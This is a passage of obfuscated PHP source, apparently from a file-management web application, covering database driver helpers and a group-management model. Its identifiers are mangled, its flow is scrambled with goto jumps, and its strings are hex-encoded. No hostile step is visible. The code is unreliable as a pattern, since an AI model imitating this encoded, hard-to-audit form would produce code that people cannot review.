? strtolower($e¯ÕÊ‚¾[$C°õ»…î‘[89]]) == $C°õ»…î‘[38] : (isset($e¯ÕÊ‚¾[$C°õ»…î‘[54]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[54]] : !1), $C°õ»…î‘[39] => isset($e¯ÕÊ‚¾[$C°õ»…î‘[866]]) ? strtolower($e¯ÕÊ‚¾[$C°õ»…î‘[866]]) == $C°õ»…î‘[41] : (isset($e¯ÕÊ‚¾[$C°õ»…î‘[89]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[89]] : !1)); } } goto dÚŠî‘à¡; dÚŠî‘à¡: return $A³ØåîÚ‚Î; goto bÃŒ×¨º†; fŒ¡•°‹´: $C°õ»…î‘ =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!0); if (think_config($C°õ»…î‘[850])) { $dº¨ğŠ‡ = str_replace($C°õ»…î‘[851], $Eª™Ÿ†Éè¢, think_config($C°õ»…î‘[850])); } else { switch ($this->dbType) { case $C°õ»…î‘[834]: case $C°õ»…î‘[852]: $dº¨ğŠ‡ = "\x53\105\x4c\x45\x43\x54\40\40\x20\143\x6f\154\165\155\156\137\x6e\x61\x6d\145\40\x61\163\x20\47\116\141\x6d\145\x27\54\40\x20\x20\x64\141\x74\141\137\x74\x79\x70\x65\40\141\163\40\x27\x54\171\x70\145\47\54\x20\x20\x20\x63\x6f\154\165\155\156\137\144\145\146\141\x75\154\164\40\x61\x73\x20\x27\104\x65\x66\x61\165\x6c\164\x27\54\40\40\x20\151\163\137\156\x75\x6c\x6c\x61\x62\154\145\40\x61\x73\x20\47\116\165\x6c\154\47\xa\x9\11\106\122\117\x4d\x9\151\x6e\146\157\162\155\x61\164\x69\x6f\156\x5f\x73\x63\x68\145\155\x61\56\164\141\142\x6c\x65\x73\x20\101\x53\x20\x74\12\11\11\x4a\117\111\x4e\11\x69\156\146\157\x72\155\141\164\151\x6f\x6e\137\163\143\150\x65\155\x61\x2e\143\x6f\x6c\x75\x6d\156\x73\40\101\123\40\143\xa\11\x9\117\x4e\40\x20\x74\x2e\x74\141\x62\154\x65\137\143\141\164\141\154\157\x67\x20\75\x20\x63\56\164\x61\x62\154\x65\x5f\x63\x61\164\x61\154\x6f\x67\12\11\11\x41\116\x44\x20\x74\x2e\164\x61\x62\x6c\145\137\x73\x63\150\x65\155\x61\x20\75\x20\143\56\164\141\x62\154\145\137\163\x63\x68\x65\x6d\141\xa\x9\11\x41\116\x44\40\164\x2e\164\141\142\x6c\145\x5f\156\x61\x6d\x65\40\75\x20\x63\56\x74\141\x62\x6c\x65\x5f\x6e\x61\x6d\x65\xa\11\x9\127\x48\x45\122\x45\x20\40\40\x74\x2e\x74\141\x62\x6c\x65\x5f\x6e\x61\155\x65\40\75\40\47{$Eª™Ÿ†Éè¢}\x27"; break; case $C°õ»…î‘[853]: $dº¨ğŠ‡ = $C°õ»…î‘[854] . $Eª™Ÿ†Éè¢ . $C°õ»…î‘[855]; break; case $C°õ»…î‘[835]: case $C°õ»…î‘[837]: $dº¨ğŠ‡ = $C°õ»…î‘[856] . $C°õ»…î‘[857] . $C°õ»…î‘[858] . strtoupper($Eª™Ÿ†Éè¢) . $C°õ»…î‘[859] . strtoupper($Eª™Ÿ†Éè¢) . $C°õ»…î‘[860]; break; case $C°õ»…î‘[861]: $dº¨ğŠ‡ = $C°õ»…î‘[862] . $Eª™Ÿ†Éè¢ . $C°õ»…î‘[863]; break; case $C°õ»…î‘[836]: break; case $C°õ»…î‘[864]: default: $dº¨ğŠ‡ = $C°õ»…î‘[865] . ($this->dbType == $C°õ»…î‘[864] ? "\140{$Eª™Ÿ†Éè¢}\x60" : $Eª™Ÿ†Éè¢); } } goto AÙÃ“âÅ«; bÃŒ×¨º†: } public function getTables($FùŞáÕÄ« = '') { $e‡¹ï‡œÅ =& $_SERVER[‡’¶øåüç˜]; if (think_config($e‡¹ï‡œÅ[867])) { $eÊ•ŞÈæë¹ = str_replace($e‡¹ï‡œÅ[868], $FùŞáÕÄ«, think_config($e‡¹ï‡œÅ[867])); } else { switch ($this->dbType) { case $e‡¹ï‡œÅ[835]: case $e‡¹ï‡œÅ[837]: $eÊ•ŞÈæë¹ = $e‡¹ï‡œÅ[869]; break; case $e‡¹ï‡œÅ[834]: case $e‡¹ï‡œÅ[852]: $eÊ•ŞÈæë¹ = $e‡¹ï‡œÅ[870]; break; case $e‡¹ï‡œÅ[861]: $eÊ•ŞÈæë¹ = $e‡¹ï‡œÅ[871]; break; case $e‡¹ï‡œÅ[836]: think_exception(think_lang($e‡¹ï‡œÅ[872]) . $e‡¹ï‡œÅ[873]); break; case $e‡¹ï‡œÅ[853]: $eÊ•ŞÈæë¹ = $e‡¹ï‡œÅ[42] . $e‡¹ï‡œÅ[43] . $e‡¹ï‡œÅ[44]; break; case $e‡¹ï‡œÅ[864]: default: if (!empty($FùŞáÕÄ«)) { $eÊ•ŞÈæë¹ = $e‡¹ï‡œÅ[817] . $FùŞáÕÄ«; } else { $eÊ•ŞÈæë¹ = $e‡¹ï‡œÅ[818]; } } } $E×ºÛªÆ™× = $this->query($eÊ•ŞÈæë¹); $fÎ¢Ÿß¸ˆ = array(); foreach ($E×ºÛªÆ™× as $Añï‚½ÏÄÁ => $AÅÓäù­ËÏ) { $fÎ¢Ÿß¸ˆ[$Añï‚½ÏÄÁ] = current($AÅÓäù­ËÏ); } return $fÎ¢Ÿß¸ˆ; } protected function parseLimit($eòØŞø¤‘Ä) { $Eë®ˆº×÷æ =& $_SERVER[‡’¶øåüç˜]; $CÈ¨¥Úßçó = $Eë®ˆº×÷æ[33]; if (!empty($eòØŞø¤‘Ä)) { switch ($this->dbType) { case $Eë®ˆº×÷æ[861]: case $Eë®ˆº×÷æ[853]: $eòØŞø¤‘Ä = explode($Eë®ˆº×÷æ[47], $eòØŞø¤‘Ä); if (count($eòØŞø¤‘Ä) > 1) { $CÈ¨¥Úßçó .= $Eë®ˆº×÷æ[48] . $eòØŞø¤‘Ä[1] . $Eë®ˆº×÷æ[49] . $eòØŞø¤‘Ä[0] . $Eë®ˆº×÷æ[50]; } else { $CÈ¨¥Úßçó .= $Eë®ˆº×÷æ[48] . $eòØŞø¤‘Ä[0] . $Eë®ˆº×÷æ[50]; } break; case $Eë®ˆº×÷æ[834]: case $Eë®ˆº×÷æ[852]: break; case $Eë®ˆº×÷æ[836]: break; case $Eë®ˆº×÷æ[835]: case $Eë®ˆº×÷æ[837]: break; case $Eë®ˆº×÷æ[864]: default: $CÈ¨¥Úßçó .= $Eë®ˆº×÷æ[48] . $eòØŞø¤‘Ä . $Eë®ˆº×÷æ[50]; } } return $CÈ¨¥Úßçó; } public function parseKey(&$B„’˜¿çòÂ, $cÃç÷”œì” = true) { $C©†¹éí‰˜ =& $_SERVER[‡’¶øåüç˜]; if ($cÃç÷”œì”) { $B„’˜¿çòÂ = $this->parseKeyCheck($B„’˜¿çòÂ); } if ($this->dbType == $C©†¹éí‰˜[864]) { if ($B„’˜¿çòÂ != $C©†¹éí‰˜[180] && !preg_match($C©†¹éí‰˜[828], $B„’˜¿çòÂ)) { $B„’˜¿çòÂ = $C©†¹éí‰˜[829] . trim($B„’˜¿çòÂ, $C©†¹éí‰˜[829]) . $C©†¹éí‰˜[829]; } return $B„’˜¿çòÂ; } else { return parent::parseKey($B„’˜¿çòÂ); } } public function close() { $this->_linkID = null; } public function error() { $CÖ°¢Â‚õ³ =& $_SERVER[‡’¶øåüç˜]; if ($this->PDOStatement) { $EÇ¡•„Çø = $this->PDOStatement->errorInfo(); $this->error = $EÇ¡•„Çø[1] . $CÖ°¢Â‚õ³[4] . $EÇ¡•„Çø[2]; } else { $this->error = $CÖ°¢Â‚õ³[33]; } if ($CÖ°¢Â‚õ³[33] != $this->queryStr) { $this->error .= LNG($CÖ°¢Â‚õ³[45]) . $this->queryStr; } think_trace($this->error, $CÖ°¢Â‚õ³[33], $CÖ°¢Â‚õ³[46]); return $this->error; } public function escapeString($aæ¥ÎñÁ«æ) { $føÕ•òŠÙ =& $_SERVER[‡’¶øåüç˜]; switch ($this->dbType) { case $føÕ•òŠÙ[861]: case $føÕ•òŠÙ[834]: case $føÕ•òŠÙ[852]: case $føÕ•òŠÙ[864]: return addslashes($aæ¥ÎñÁ«æ); case $føÕ•òŠÙ[836]: case $føÕ•òŠÙ[853]: case $føÕ•òŠÙ[835]: case $føÕ•òŠÙ[837]: return str_ireplace($føÕ•òŠÙ[55], $føÕ•òŠÙ[56], $aæ¥ÎñÁ«æ); } } protected function parseValue($b½ªÑ¶ÙØÀ) { $DÁ¤ŒÜŸ°ñ =& $_SERVER[‡’¶øåüç˜]; if (is_string($b½ªÑ¶ÙØÀ)) { $b½ªÑ¶ÙØÀ = strpos($b½ªÑ¶ÙØÀ, $DÁ¤ŒÜŸ°ñ[4]) === 0 ? $this->escapeString($b½ªÑ¶ÙØÀ) : $DÁ¤ŒÜŸ°ñ[874] . $this->escapeString($b½ªÑ¶ÙØÀ) . $DÁ¤ŒÜŸ°ñ[874]; } elseif (isset($b½ªÑ¶ÙØÀ[0]) && is_string($b½ªÑ¶ÙØÀ[0]) && strtolower($b½ªÑ¶ÙØÀ[0]) == $DÁ¤ŒÜŸ°ñ[289]) { $b½ªÑ¶ÙØÀ = $this->escapeString($b½ªÑ¶ÙØÀ[1]); } elseif (is_array($b½ªÑ¶ÙØÀ)) { $b½ªÑ¶ÙØÀ = array_map(array($this, $DÁ¤ŒÜŸ°ñ[875]), $b½ªÑ¶ÙØÀ); } elseif (is_bool($b½ªÑ¶ÙØÀ)) { $b½ªÑ¶ÙØÀ = $b½ªÑ¶ÙØÀ ? $DÁ¤ŒÜŸ°ñ[83] : $DÁ¤ŒÜŸ°ñ[481]; } elseif (is_null($b½ªÑ¶ÙØÀ)) { $b½ªÑ¶ÙØÀ = $DÁ¤ŒÜŸ°ñ[99]; } return $b½ªÑ¶ÙØÀ; } public function getLastInsertId() { $c²Œ”Ï»ƒ… =& $_SERVER[‡’¶øåüç˜]; switch ($this->dbType) { case $c²Œ”Ï»ƒ…[861]: case $c²Œ”Ï»ƒ…[853]: case $c²Œ”Ï»ƒ…[834]: case $c²Œ”Ï»ƒ…[852]: case $c²Œ”Ï»ƒ…[836]: case $c²Œ”Ï»ƒ…[864]: return $this->_linkID->lastInsertId(); case $c²Œ”Ï»ƒ…[835]: case $c²Œ”Ï»ƒ…[837]: $Fƒ‚Ğ»¢àã = $this->table; $C×ìõˆÒ”… = $this->query("\123\x45\x4c\105\103\124\40{$Fƒ‚Ğ»¢àã}\56\143\165\162\162\166\141\x6c\x20\x63\x75\162\162\166\141\x6c\x20\106\x52\x4f\x4d\x20\x64\165\141\154"); return $C×ìõˆÒ”… ? $C×ìõˆÒ”…[0][$c²Œ”Ï»ƒ…[876]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($a†åğŞŒ¤Ã) { $aí…ƒÎÖ‘ =& $_SERVER[‡’¶øåüç˜]; if (!CacheLock::fileLock($aí…ƒÎÖ‘[9])) { return !1; } $f£®ˆ¦ŠœÑ = parent::query($a†åğŞŒ¤Ã); CacheLock::fileUnLock($aí…ƒÎÖ‘[9]); return $f£®ˆ¦ŠœÑ; } public function execute($EÔ¤ÙÒºóÂ) { $eùâÌ‘ÍÀ =& $_SERVER[‡’¶øåüç˜]; if (!CacheLock::fileLock($eùâÌ‘ÍÀ[9])) { return !1; } $dÇóµ‚ÀÖ¶ = parent::execute($EÔ¤ÙÒºóÂ); CacheLock::fileUnLock($eùâÌ‘ÍÀ[9]); return $dÇóµ‚ÀÖ¶; } } class DbSqlite3 extends DbSqlite3Base { public function query($F°ôÔ¸İ—) { $eĞ°¬¡‹ =& $_SERVER[‡’¶øåüç˜]; if (!CacheLock::fileLock($eĞ°¬¡‹[9])) { return !1; } $eÍÀ½®Ÿğ¤ = parent::query($F°ôÔ¸İ—); CacheLock::fileUnLock($eĞ°¬¡‹[9]); return $eÍÀ½®Ÿğ¤; } public function execute($d»‹³‡Œµ) { $CôæÀíø‡™ =& $_SERVER[‡’¶øåüç˜]; if (!CacheLock::fileLock($CôæÀíø‡™[9])) { return !1; } $B¼·…Ø³©Î = parent::execute($d»‹³‡Œµ); CacheLock::fileUnLock($CôæÀíø‡™[9]); return $B¼·…Ø³©Î; } } goto fÌùáœ”¬; b‘²Ï¶å‹: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\145" => "\147\x72\157\x75\160\x5f\155\x65\164\141", "\155\145\164\x61\x46\151\145\x6c\x64" => "\147\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($dÖµÓô…Å) { $FÆ«ëãŒÊ =& $_SERVER[‡’¶øåüç˜]; return array($FÆ«ëãŒÊ[2181] => array($dÖµÓô…Å[0], $FÆ«ëãŒÊ[2182]), $FÆ«ëãŒÊ[2183] => array($dÖµÓô…Å[0], $FÆ«ëãŒÊ[2182])); } protected function getInfo($Eå£ÒØö© ) { $F×ùÑïÈ¯À = $this->getInfoSimple($Eå£ÒØö© ); if (!$F×ùÑïÈ¯À) { return !1; } return $this->_listDataApplyItem($F×ùÑïÈ¯À); } protected function getInfoSimple($BœÇËÎ¿›ğ, $d› ‚Ë¥À› = false) { $EçØŸŠ² =& $_SERVER[‡’¶øåüç˜]; if ($d› ‚Ë¥À›) { $cÑ ªŒ÷Ñ† = array($EçØŸŠ²[2112] => intval($BœÇËÎ¿›ğ)); $A—–Ûƒõ“š = $this->where($cÑ ªŒ÷Ñ†)->find(); return is_array($A—–Ûƒõ“š) ? $A—–Ûƒõ“š : array(); } return $this->cacheFunctionGet($EçØŸŠ²[2184], $BœÇËÎ¿›ğ); } protected function groupAdd($CÇ£é™£Ò¤) { goto b¸šò†Ô²†; b¸šò†Ô²†: $F§èí¬Š´ï =& $_SERVER[‡’¶øåüç˜]; if (!$CÇ£é™£Ò¤[$F§èí¬Š´ï[474]] && isset($CÇ£é™£Ò¤[$F§èí¬Š´ï[2112]]) && $CÇ£é™£Ò¤[$F§èí¬Š´ï[2112]] == 1) { if ($bİºøšâƒº = $this->getInfoSimple($CÇ£é™£Ò¤[$F§èí¬Š´ï[2112]], !0)) { return $CÇ£é™£Ò¤[$F§èí¬Š´ï[2112]]; } } else { $bİºøšâƒº = $this->getInfoSimple($CÇ£é™£Ò¤[$F§èí¬Š´ï[474]]); if (!$bİºøšâƒº) { return !1; } } $CòÀ§å±ö = $F§èí¬Š´ï[483]; goto f¹¶áĞÕÚ…; EŞ­ìá·ó: if (isset($CÇ£é™£Ò¤[$F§èí¬Š´ï[2187]])) { $this->metaSet($AŠùáÒòê, array($F§èí¬Š´ï[2187] => $CÇ£é™£Ò¤[$F§èí¬Š´ï[2187]], $F§èí¬Š´ï[2188] => $CÇ£é™£Ò¤[$F§èí¬Š´ï[2188]])); unset($CÇ£é™£Ò¤[$F§èí¬Š´ï[2187]]); unset($CÇ£é™£Ò¤[$F§èí¬Š´ï[2188]]); } Model($F§èí¬Š´ï[1124])->groupRootAdd($AŠùáÒòê); return $AŠùáÒòê; goto a ò×±Îœè; f¹¶áĞÕÚ…: if ($bİºøšâƒº[$F§èí¬Š´ï[472]]) { $CòÀ§å±ö = $bİºøšâƒº[$F§èí¬Š´ï[472]] . $bİºøšâƒº[$F§èí¬Š´ï[2112]] . $F§èí¬Š´ï[47]; } $a‹ôÓ´Ûõ = array($F§èí¬Š´ï[398] => $this->groupNameAuto($CÇ£é™£Ò¤[$F§èí¬Š´ï[474]], $CÇ£é™£Ò¤[$F§èí¬Š´ï[28]]), $F§èí¬Š´ï[380] => $CÇ£é™£Ò¤[$F§èí¬Š´ï[474]], $F§èí¬Š´ï[538] => $CòÀ§å±ö, $F§èí¬Š´ï[2185] => $CÇ£é™£Ò¤[$F§èí¬Š´ï[2096]], $F§èí¬Š´ï[2186] => 0, $F§èí¬Š´ï[2116] => 0); if (isset($CÇ£é™£Ò¤[$F§èí¬Š´ï[2134]])) { $a‹ôÓ´Ûõ[$F§èí¬Š´ï[2134]] = $CÇ£é™£Ò¤[$F§èí¬Š´ï[2134]]; } else { $eÉß¨õÛ×í = $this->max($F§èí¬Š´ï[2134]); if (!$eÉß¨õÛ×í) { $eÉß¨õÛ×í = 0; } $a‹ôÓ´Ûõ[$F§èí¬Š´ï[2134]] = $eÉß¨õÛ×í + 1; } goto A†éÎ¥ÜØè; A†éÎ¥ÜØè: if (!empty($CÇ£é™£Ò¤[$F§èí¬Š´ï[2112]])) { $a‹ôÓ´Ûõ[$F§èí¬Š´ï[2112]] = $CÇ£é™£Ò¤[$F§èí¬Š´ï[2112]]; } $AŠùáÒòê = $this->add($a‹ôÓ´Ûõ); $this->setNamePinyin($AŠùáÒòê, $a‹ôÓ´Ûõ[$F§èí¬Š´ï[28]]); goto EŞ­ìá·ó; a ò×±Îœè: } protected function groupEdit($FÁˆÉ‚ÑˆÛ, $dŒõçØ±Ø°) { $EŞîÚ¾ÊÆò =& $_SERVER[‡’¶øåüç˜]; if (!empty($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[474]])) { $dò²‰›äÔ‚ = $this->getInfoSimple($FÁˆÉ‚ÑˆÛ); $f®ŠÙ„ùÁ¥ = $this->getInfoSimple($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[474]]); if (!$dò²‰›äÔ‚ || !$f®ŠÙ„ùÁ¥) { return !1; } if ($dò²‰›äÔ‚[$EŞîÚ¾ÊÆò[2112]] == $f®ŠÙ„ùÁ¥[$EŞîÚ¾ÊÆò[2112]]) { return !1; } if ($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[474]] != $dò²‰›äÔ‚[$EŞîÚ¾ÊÆò[474]]) { if ($f®ŠÙ„ùÁ¥[$EŞîÚ¾ÊÆò[472]] !== $dò²‰›äÔ‚[$EŞîÚ¾ÊÆò[472]] && strpos($f®ŠÙ„ùÁ¥[$EŞîÚ¾ÊÆò[472]], $dò²‰›äÔ‚[$EŞîÚ¾ÊÆò[472]] . $dò²‰›äÔ‚[$EŞîÚ¾ÊÆò[2112]] . $EŞîÚ¾ÊÆò[47]) === 0) { return !1; } $dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[538]] = $f®ŠÙ„ùÁ¥[$EŞîÚ¾ÊÆò[472]] . $dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[474]] . $EŞîÚ¾ÊÆò[47]; $this->_changeChildLevel($dò²‰›äÔ‚, $f®ŠÙ„ùÁ¥); } } if (isset($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[28]])) { $this->setNamePinyin($FÁˆÉ‚ÑˆÛ, $dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[28]]); } if (isset($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[2187]])) { $this->metaSet($FÁˆÉ‚ÑˆÛ, array($EŞîÚ¾ÊÆò[2187] => $dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[2187]], $EŞîÚ¾ÊÆò[2188] => $dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[2188]])); unset($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[2187]]); unset($dŒõçØ±Ø°[$EŞîÚ¾ÊÆò[2188]]); } return $this->where(array($EŞîÚ¾ÊÆò[2189] => $FÁˆÉ‚ÑˆÛ))->save($dŒõçØ±Ø°); } private function _changeChildLevel($FèœÛ£ˆ¡›, $f÷ÔŠÌÒ¾ï, $a†³–óå·› = false) { goto A¹¦æ„Ï»¢; dÆ“ÛÚŒöë: $this->where($BĞ’àâÒù¥)->data($BîÜ¼­¸¥—)->save(); goto D˜»œ»½½Å; A¹¦æ„Ï»¢: $f¥†‰Ïéâ” =& $_SERVER[‡’¶øåüç˜]; $BîˆÃ¦ôğ = $FèœÛ£ˆ¡›[$f¥†‰Ïéâ”[472]] . $FèœÛ£ˆ¡›[$f¥†‰Ïéâ”[2112]] . $f¥†‰Ïéâ”[47]; $eÀØ÷¡ƒç  = $f÷ÔŠÌÒ¾ï[$f¥†‰Ïéâ”[472]] . $f÷ÔŠÌÒ¾ï[$f¥†‰Ïéâ”[2112]] . $f¥†‰Ïéâ”[47] . $FèœÛ£ˆ¡›[$f¥†‰Ïéâ”[2112]] . $f¥†‰Ïéâ”[47]; goto e„‘ÏÕ¨‰; e„‘ÏÕ¨‰: if ($a†³–óå·›) { $eÀØ÷¡ƒç  = $f÷ÔŠÌÒ¾ï[$f¥†‰Ïéâ”[472]] . $f÷ÔŠÌÒ¾ï[$f¥†‰Ïéâ”[2112]] . $f¥†‰Ïéâ”[47]; } $BĞ’àâÒù¥ = array($f¥†‰Ïéâ”[538] => array($f¥†‰Ïéâ”[496], $FèœÛ£ˆ¡›[$f¥†‰Ïéâ”[472]] . $FèœÛ£ˆ¡›[$f¥†‰Ïéâ”[2112]] . $f¥†‰Ïéâ”[497])); $BîÜ¼­¸¥— = array($f¥†‰Ïéâ”[538] => array($f¥†‰Ïéâ”[546], "\x72\145\x70\x6c\x61\x63\x65\50\x70\141\162\145\x6e\164\x4c\145\x76\x65\x6c\54\47{$BîˆÃ¦ôğ}\47\54\x27{$eÀØ÷¡ƒç }\47\51")); goto dÆ“ÛÚŒöë; D˜»œ»½½Å: } public function setNamePinyin($e¿¦ª¥ÎŸ©, $fâÍáù‚±Û = false) { $AÂº…ÕÏ†¾ =& $_SERVER[‡’¶øåüç˜]; if (!$fâÍáù‚±Û) { $EœÌò†×‰ = $this->getInfoSimple($e¿¦ª¥ÎŸ©); $fâÍáù‚±Û = $EœÌò†×‰[$AÂº…ÕÏ†¾[28]]; } if (!Input::check($fâÍáù‚±Û, $AÂº…ÕÏ†¾[541])) { $this->metaSet($e¿¦ª¥ÎŸ©, $AÂº…ÕÏ†¾[428], null); $this->metaSet($e¿¦ª¥ÎŸ©, $AÂº…ÕÏ†¾[427], null); return; } $fğ‡ššİ‹¢ = array($AÂº…ÕÏ†¾[428] => str_replace($AÂº…ÕÏ†¾[50], $AÂº…ÕÏ†¾[33], Pinyin::encode($fâÍáù‚±Û)), $AÂº…ÕÏ†¾[427] => Pinyin::encode($fâÍáù‚±Û, $AÂº…ÕÏ†¾[542])); $this->metaSet($e¿¦ª¥ÎŸ©, $fğ‡ššİ‹¢); } protected function groupStatus($c¹¦µó¢˜, $BÀ¾¥¦“ÀÌ) { goto bÕ‚˜÷†š„; cÑŠàÉçÉâ: if ($BÀ¾¥¦“ÀÌ == $A½â«ÑßÊÅ[83]) { $BÍÒ¨µŒã© = $this->parentLevelArray($Cô‰ï¢İã[$A½â«ÑßÊÅ[472]]); } else { $C®¼ìñÍÍ˜ = array($A½â«ÑßÊÅ[538] => array($A½â«ÑßÊÅ[496], $Cô‰ï¢İã[$A½â«ÑßÊÅ[472]] . $Cô‰ï¢İã[$A½â«ÑßÊÅ[2112]] . $A½â«ÑßÊÅ[497])); $BÍÒ¨µŒã© = $this->where($C®¼ìñÍÍ˜)->field($A½â«ÑßÊÅ[2112])->select(); $BÍÒ¨µŒã© = array_to_keyvalue($BÍÒ¨µŒã©, $A½â«ÑßÊÅ[33], $A½â«ÑßÊÅ[2112]); } $BÍÒ¨µŒã©[] = $Cô‰ï¢İã[$A½â«ÑßÊÅ[2112]]; $fŠ¾«¨ïÙã = array(); goto E³²¸«·æ¡; E³²¸«·æ¡: foreach ($BÍÒ¨µŒã© as $c¹¦µó¢˜) { $fŠ¾«¨ïÙã[] = array($A½â«ÑßÊÅ[2112] => $c¹¦µó¢˜, $A½â«ÑßÊÅ[89] => $A½â«ÑßÊÅ[695], $A½â«ÑßÊÅ[363] => $BÀ¾¥¦“ÀÌ); } return Model($A½â«ÑßÊÅ[2190])->addAll($fŠ¾«¨ïÙã, array(), !0); goto c«ˆ†ã°§; bÕ‚˜÷†š„: $A½â«ÑßÊÅ =& $_SERVER[‡’¶øåüç˜]; $Cô‰ï¢İã = $this->getInfoSimple($c¹¦µó¢˜); if (!$Cô‰ï¢İã) { return !1; } goto cÑŠàÉçÉâ; c«ˆ†ã°§: } protected function groupRemove($e‘•¾¼ìªÄ) { goto Dß”“ˆ‚—›; D¦¹¿½õ¶ö: Model($E¾¢§ˆïŠ»[758])->groupRootRemove($e‘•¾¼ìªÄ); return $this->where($eï›Öá£ÓÃ)->delete(); goto E¶¦”íå•; AšßÆ‘Œ¡»: $this->where(array($E¾¢§ˆïŠ»[474] => $e‘•¾¼ìªÄ))->save(array($E¾¢§ˆïŠ»[474] => $d¯ŸòÙÖä¢[$E¾¢§ˆïŠ»[474]])); Model($E¾¢§ˆïŠ»[2190])->where($eï›Öá£ÓÃ)->delete(); Model($E¾¢§ˆïŠ»[2191])->where($eï›Öá£ÓÃ)->delete(); goto D¦¹¿½õ¶ö; d²Íöô›İ: if (!$d¯ŸòÙÖä¢ || $d¯ŸòÙÖä¢[$E¾¢§ˆïŠ»[474]] == 0) { return !1; } $c‘ ­†ƒ¶ = $this->getInfoSimple($d¯ŸòÙÖä¢[$E¾¢§ˆïŠ»[474]]); $this->_changeChildLevel($d¯ŸòÙÖä¢, $c‘ ­†ƒ¶, !0); goto AšßÆ‘Œ¡»; Dß”“ˆ‚—›: $E¾¢§ˆïŠ» =& $_SERVER[‡’¶øåüç˜]; $eï›Öá£ÓÃ = array($E¾¢§ˆïŠ»[2112] => $e‘•¾¼ìªÄ); $d¯ŸòÙÖä¢ = $this->where($eï›Öá£ÓÃ)->find(); goto d²Íöô›İ; E¶¦”íå•: } protected function groupSort($B†ºÜ´ù) { $dä³Ô¬œÓ™ =& $_SERVER[‡’¶øåüç˜]; $aò¾«ÒŠ° = array(); foreach ($B†ºÜ´ù as $BÌ¼Ø ›Ïí => $E‡“™Ä™õÈ) { $aò¾«ÒŠ°[] = array($dä³Ô¬œÓ™[2112], $E‡“™Ä™õÈ, $dä³Ô¬œÓ™[2134], $BÌ¼Ø ›Ïí + 1); } $this->saveAll($aò¾«ÒŠ°); } public function listData() { $a‘…ºœêÛ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a‘…ºœêÛ[$_SERVER[‡’¶øåüç˜][358]]); return $a‘…ºœêÛ; } private function _makeOrder($BùÑ”–³¾‹ = '') { goto e¦æíİñ…; C¶ƒ«×³¶Ğ: $bƒ¹Âà†‰ = Input::get($CîÊÔ‘àÉï[419], $CîÊÔ‘àÉï[7], $CîÊÔ‘àÉï[2116], $BÌ¸ÄÏÅİÂ); $E·çª›¸‰ = Input::get($CîÊÔ‘àÉï[420], $CîÊÔ‘àÉï[7], $CîÊÔ‘àÉï[2192], array($CîÊÔ‘àÉï[2192], $CîÊÔ‘àÉï[416])); $E·çª›¸‰ = $e˜œ¶éß¥Î[$E·çª›¸‰]; goto cĞÉŞ¸‰Æ…; cĞÉŞ¸‰Æ…: $BùÑ”–³¾‹ = $BùÑ”–³¾‹ . "{$bƒ¹Âà†‰}\40{$E·çª›¸‰}\54\40\x67\162\157\165\160\111\104\40\x61\163\x63"; return $this->order($BùÑ”–³¾‹); goto E¦‰‰‰®Í; e¦æíİñ…: $CîÊÔ‘àÉï =& $_SERVER[‡’¶øåüç˜]; $BÌ¸ÄÏÅİÂ = array($CîÊÔ‘àÉï[2112], $CîÊÔ‘àÉï[28], $CîÊÔ‘àÉï[2098], $CîÊÔ‘àÉï[191]); $e˜œ¶éß¥Î = array($CîÊÔ‘àÉï[414] => $CîÊÔ‘àÉï[415], $CîÊÔ‘àÉï[416] => $CîÊÔ‘àÉï[417]); goto C¶ƒ«×³¶Ğ; E¦‰‰‰®Í: } public function listChild($EèôÁùãÜÇ) { $Eö«ãÕãÊß =& $_SERVER[‡’¶øåüç˜]; $aØõÓÙ±Å‘ = $this->where(array($Eö«ãÕãÊß[474] => $EèôÁùãÜÇ))->_makeOrder()->selectPage(200); $this->_listDataApply($aØõÓÙ±Å‘[$Eö«ãÕãÊß[358]]); return $aØõÓÙ±Å‘; } public function listByID($cø‘ùá¼Ü¼) { $Cªš§ÀÛğ =& $_SERVER[‡’¶øåüç˜]; if (!$cø‘ùá¼Ü¼) { return array(); } $AáìÎ¸±É = array($Cªš§ÀÛğ[2112] => array($Cªš§ÀÛğ[7], $cø‘ùá¼Ü¼)); $BŒù¾Å§ê° = $this->where($AáìÎ¸±É)->select(); $this->_listDataApply($BŒù¾Å§ê°); return $BŒù¾Å§ê°; } public function listSearch($A£¥ƒ‰œã¨) { goto a µ‘Îù¯Ì; a µ‘Îù¯Ì: $E¡‚Ş²•ç’ =& $_SERVER[‡’¶øåüç˜]; $E…ËÍàÏ = $A£¥ƒ‰œã¨[$E¡‚Ş²•ç’[2193]]; $a‹“ÉÆ¨† = isset($A£¥ƒ‰œã¨[$E¡‚Ş²•ç’[2194]]) ? $A£¥ƒ‰œã¨[$E¡‚Ş²•ç’[2194]] : !1; goto Ašôñ‹»÷¦; Ašôñ‹»÷¦: if (!trim($E…ËÍàÏ)) { return !1; } $E…ËÍàÏ = str_replace($E¡‚Ş²•ç’[2195], $E¡‚Ş²•ç’[2196], $E…ËÍàÏ); $e„Œ÷ÑÖ«– = array($E¡‚Ş²•ç’[2112] => array($E¡‚Ş²•ç’[757], "\45{$E…ËÍàÏ}\45"), $E¡‚Ş²•ç’[28] => array($E¡‚Ş²•ç’[757], "\45{$E…ËÍàÏ}\x25"), $E¡‚Ş²•ç’[917] => $E¡‚Ş²•ç’[2197]); goto a™æÂ˜…ñ·; a™æÂ˜…ñ·: if ($a‹“ÉÆ¨†) { $eÅÓš±—Œ½ = $this->getInfoSimple($a‹“ÉÆ¨†); $Aæ«³Öåé = $eÅÓš±—Œ½[$E¡‚Ş²•ç’[472]] . $a‹“ÉÆ¨† . $E¡‚Ş²•ç’[497]; $e„Œ÷ÑÖ«– = 